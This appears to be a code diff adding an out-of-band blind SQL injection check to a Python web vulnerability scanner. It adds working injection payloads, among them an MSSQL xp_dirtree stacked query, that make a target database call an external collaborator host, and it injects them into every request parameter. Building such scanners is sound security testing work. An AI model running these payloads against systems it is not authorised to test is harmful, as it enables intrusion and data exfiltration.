@@ -8,6 +8,7 @@ import statistics
 import httpx
 
 from shroodler.models import Finding
+from shroodler.oob import collaborator_of, confirm_oob
 from shroodler.pacer import Pacer
 from shroodler.probes.common import (
     body_text,
@@ -59,6 +60,7 @@ _TIME_THRESHOLD = 2.0
 _TIME_BASED_THRESHOLD = 3.5
 _BASELINE_SKIP = 2.0
 _BOOLEAN_LENGTH_RATIO = 0.20
+_COLLAB_WAIT = 3.0
 
 
 def _has_sql_error(body: str) -> bool:
@@ -148,6 +150,71 @@ def _boolean_differs(true_resp: httpx.Response, false_resp: httpx.Response) -> b
     return abs(true_len - false_len) / largest > _BOOLEAN_LENGTH_RATIO
 
 
+def _oob_sqli_payloads(callback_url: str) -> tuple[str, ...]:
+    """Conservative read-only-intent side channels. Confirm only on an HTTP hit."""
+    mssql = (
+        f"'; DECLARE @h varchar(1024); SET @h='{callback_url}'; "
+        "EXEC master..xp_dirtree @h;--"
+    )
+    generic = f"' UNION SELECT '{callback_url}'--"
+    return (mssql, generic)
+
+
+def _probe_sqli_oob(
+    url: str,
+    method_u: str,
+    normalized: list[dict],
+    cookie_header: str,
+    collab,
+    *,
+    client: httpx.Client | None,
+    pacer: Pacer | None,
+    state,
+    waf_detected: bool,
+    waf_vendor: str | None,
+) -> Finding | None:
+    try:
+        minted = collab.mint("sqli")
+    except Exception:  # noqa: BLE001
+        return None
+    payloads = expand_if_waf(
+        _oob_sqli_payloads(minted.url),
+        state=state,
+        waf_detected=waf_detected,
+        waf_vendor=waf_vendor,
+    )
+    for item in normalized:
+        name = item["name"]
+        for payload in payloads:
+            inject(
+                url,
+                method_u,
+                normalized,
+                name,
+                payload,
+                cookie_header=cookie_header,
+                client=client,
+                pacer=pacer,
+            )
+    hit = confirm_oob(collab, minted.token, timeout=_COLLAB_WAIT)
+    if hit is None:
+        return None
+    return _finding(
+        finding_id="sqli-oob",
+        url=url,
+        description=(
+            "A SQL injection payload triggered an out-of-band HTTP callback "
+            "(confirmed blind SQLi)."
+        ),
+        evidence=(
+            f"token={minted.token} url={minted.url} remote={hit.remote} "
+            f"method={hit.method} path={hit.path}"
+        ),
+        confidence="confirmed",
+        severity="high",
+    )
+
+
 def probe_sqli(
     url: str,
     method: str,
@@ -159,6 +226,7 @@ def probe_sqli(
     state=None,
     waf_detected: bool = False,
     waf_vendor: str | None = None,
+    oob=None,
 ) -> list[Finding]:
     """Replay GET/POST params with classic SQLi payloads, one param at a time.
 
@@ -173,6 +241,7 @@ def probe_sqli(
         return []
 
     findings: list[Finding] = []
+    collab = collaborator_of(oob, state)
     error_payloads = expand_if_waf(
         _ERROR_PAYLOADS,
         state=state,
@@ -368,5 +437,21 @@ def probe_sqli(
             )
         )
         break
+
+    if collab is not None and not findings:
+        oob_finding = _probe_sqli_oob(
+            url,
+            method_u,
+            normalized,
+            cookie_header,
+            collab,
+            client=client,
+            pacer=pacer,
+            state=state,
+            waf_detected=waf_detected,
+            waf_vendor=waf_vendor,
+        )
+        if oob_finding is not None:
+            findings.append(oob_finding)
 
     return dedupe(findings)
